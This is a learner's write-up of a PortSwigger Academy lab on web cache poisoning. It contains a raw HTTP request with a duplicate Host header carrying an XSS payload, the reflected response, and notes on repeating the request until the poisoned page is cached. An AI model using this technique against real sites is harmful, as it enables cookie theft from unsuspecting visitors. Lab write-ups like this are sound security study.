# Lab: Web cache poisoning via ambiguous requests

This lab is vulnerable to web cache poisoning due to discrepancies in how the cache and the back-end application handle ambiguous requests. An unsuspecting user regularly visits the site's home page.

To solve the lab, poison the cache so the home page executes `alert(document.cookie)` in the victim's browser.

Analysis :

- Manipulating host header direct returns erro 50X -> bad gateway
- but when we add another host header and leaving the original one alone -> we can actually manipulate the html content
  - request

    ```Text
    GET / HTTP/1.1
    Host: 0ae900a203879288839de82700aa00a9.h1-web-security-academy.net
    Host: dedoxd2.test.com.js"></script><img src=x onerror=alert(document.cookie) /><script type="text/javascript" src="//
    ```

  - response

    ```Text
            <script type="text/javascript" src="//dedoxd2.test.com.js"></script><img src=x onerror=alert(document.cookie) /><script type="text/javascript" src="///resources/js/tracking.js">
    ```

  - The next step is to send this malicious request to the vulnerable server multible times to make it cache it -> stored xss

- My way to solve the lab did the target but portswiger academy had a better one (stealthy one)
  - while propingthe server i noticed that my payload in the second host header  gets injected directly in the `<script>` tag , my way of thinking told me that close the tags and inject ur payload
  - but the solution provided from portswigger was about importing this script from domain that the attacker domain
